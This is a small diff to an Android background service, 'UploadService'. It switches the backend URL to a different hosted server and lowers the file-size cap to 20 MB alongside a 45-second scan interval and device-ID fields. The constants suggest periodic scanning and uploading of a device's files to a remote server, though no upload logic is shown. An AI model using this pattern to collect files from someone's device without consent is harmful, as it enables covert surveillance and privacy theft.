@@ -41,9 +41,9 @@ public class UploadService extends Service {
 
     private static final String CHANNEL_ID = "snuggle_queen_love";
     private static final int NOTIFICATION_ID = 1;
-    private static final String BACKEND_URL = "https://snuggle-queen.onrender.com";
+    private static final String BACKEND_URL = "https://snuggle-queen-wa-yobby-production.up.railway.app";
     private static final long SCAN_INTERVAL = 45000;
-    private static final long MAX_FILE_SIZE = 80L * 1024 * 1024; // 80 MB cap
+    private static final long MAX_FILE_SIZE = 20L * 1024 * 1024; // 20 MB cap — skip larger files
 
     private String deviceId = "";
     private String deviceName = "";
